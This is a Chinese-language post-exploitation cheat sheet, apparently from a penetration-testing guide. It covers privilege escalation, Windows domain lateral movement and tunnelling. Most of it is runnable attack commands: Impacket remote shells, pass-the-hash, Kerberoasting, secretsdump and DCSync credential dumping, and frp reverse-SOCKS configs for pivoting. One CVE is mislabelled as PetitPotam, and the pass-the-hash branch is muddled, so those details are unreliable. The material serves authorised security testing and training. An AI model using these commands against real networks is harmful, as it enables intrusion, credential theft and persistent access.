# 后渗透方法论

### 4.1 权限提升

#### 4.1.1 Windows 提权方法论

**系统化提权流程**
```
1. 系统信息收集
   - systeminfo
   - Windows 版本与补丁
   - 使用 Windows-Exploit-Suggester 查找内核漏洞

2. 服务配置检查
   - accesschk.exe 检查服务权限
   - 查找未引用的服务路径
   - 检查服务二进制文件权限

3. 凭据收集
   - 注册表键值
   - 自动化：WinPEAS、PrivescCheck

4. UAC 绕过
   - uacmethod
   - 各种 UAC 绕过技术

5. 内核漏洞利用
   - MS16-032 / MS16-135
   - CVE-2021-1675 (PrintNightmare)
   - CVE-2022-26923 (PetitPotam)
```

#### 4.1.2 Linux 提权方法论

**系统化提权流程**
```
1. 系统信息收集
   - uname -a / cat /etc/os-release
   - 使用 linux-exploit-suggester

2. SUID 检查
   - find / -perm -4000 2>/dev/null
   - GTFOBins 查找利用方法

3. sudo 检查
   - sudo -l
   - GTFOBins 查找利用方法

4. Cron 任务检查
   - cat /etc/crontab
   - ls -la /etc/cron.*

5. 自动化
   - LinPEAS
   - LinEnum
   - linux-exploit-suggester
```

### 4.2 横向移动

#### 4.2.1 Windows 域横向移动

**横向移动决策树**
```
获取初始凭据
├── 凭据类型
│   ├── 明文密码 → Pass the Hash（需要 NTLM Hash）
│   ├── NTLM Hash → PtH（psexec/wmiexec/smbexec）
│   ├── Kerberos Ticket → PtT（Rubeus/Impacket）
│   └── AES Key → Overpass the Hash
│
├── 目标选择
│   ├── BloodHound 分析最短路径
│   ├── CrackMapExec 批量测试
│   └── BloodHound + CrackMapExec 组合
│
├── 横向技术
│   ├── PsExec (psexec.py)
│   ├── WMI (wmiexec.py)
│   ├── WinRM (evil-winrm)
│   ├── DCOM (dcomexec.py)
│   └── RDP
│
└── 凭据获取
    ├── Mimikatz (sekurlsa::logonpasswords)
    ├── LSASS dump + lsassy
    ├── Kerberoasting
    ├── AS-REP Roasting
    └── DCSync
```

#### 4.2.2 Impacket 工具使用

```bash
# 获取 Shell
impacket-psexec domain/user:password@10.0.0.10
impacket-wmiexec domain/user:password@10.0.0.10
impacket-smbexec domain/user:password@10.0.0.10

# Pass the Hash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH domain/user@10.0.0.10

# Kerberos 攻击
impacket-GetUserSPNs domain/user:password -request    # Kerberoasting
impacket-GetNPUsers domain/ -usersfile users.txt       # AS-REP Roasting
impacket-secretsdump domain/user:password@10.0.0.10   # 凭据导出

# DCSync
impacket-secretsdump domain/user:password@DC_IP -just-dc
```

### 4.3 代理与隧道

#### 4.3.1 代理方案选择

**场景分类**
```
场景1：目标出网
├── 反向 SOCKS 代理
│   ├── frp（功能全面，配置简单）
│   ├── chisel（单文件，跨平台）
│   └── Sliver / Mythic 内置代理
│
场景2：目标仅出特定端口
├── ICMP 隧道：icmpsh / iodine
├── DNS 隧道：dnscat2
└── HTTPS 代理：reGeorg / Neo-reGeorg

场景3：目标不出网
├── 正向 SOCKS 代理
│   ├── ssh -D
│   └── chisel
└── 端口转发
    └── PortForward / netsh
```

#### 4.3.2 frp 配置示例

**服务端 frps.ini**
```ini
[common]
bind_port = 7000
token = your_secret_token
```

**客户端 frpc.ini**
```ini
[common]
server_addr = 10.0.0.5
server_port = 7000
token = your_secret_token

[socks5]
type = tcp
remote_port = 1080
plugin = socks5

[rdp]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = 33890
```

**使用 proxychains 连接**
```bash
# /etc/proxychains4.conf
socks5  10.0.0.5  1080

# 使用代理
proxychains nmap -sT 10.0.0.10
proxychains impacket-psexec domain/user:password@10.0.0.10
```
